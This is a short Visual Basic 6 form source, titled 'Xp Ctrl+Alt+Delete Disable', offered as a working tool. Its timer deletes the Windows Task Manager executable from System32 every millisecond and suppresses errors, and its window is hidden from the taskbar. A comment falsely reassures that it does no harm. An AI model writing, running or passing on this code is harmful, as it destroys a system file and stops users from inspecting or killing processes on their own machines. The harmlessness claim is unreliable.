VERSION 5.00
Begin VB.Form Disable 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Xp Ctrl+Alt+Delete Disable"
   ClientHeight    =   1755
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   2670
   Icon            =   "Ctrl+Alt+Del Disable.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1755
   ScaleWidth      =   2670
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "Close"
      Height          =   1335
      Left            =   360
      TabIndex        =   0
      Top             =   240
      Width           =   1935
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Disable"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Dont Worry Every Time Taskmgr.exe Is Deleted It Makes A New 1
'So It Will Not Harm Your computer At All

Private Sub Command1_Click()
End
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
Kill "C:\WINDOWS\SYSTEM32\taskmgr.exe" 'This Will Delete Taskmgr.exe On Windows Xp
End Sub
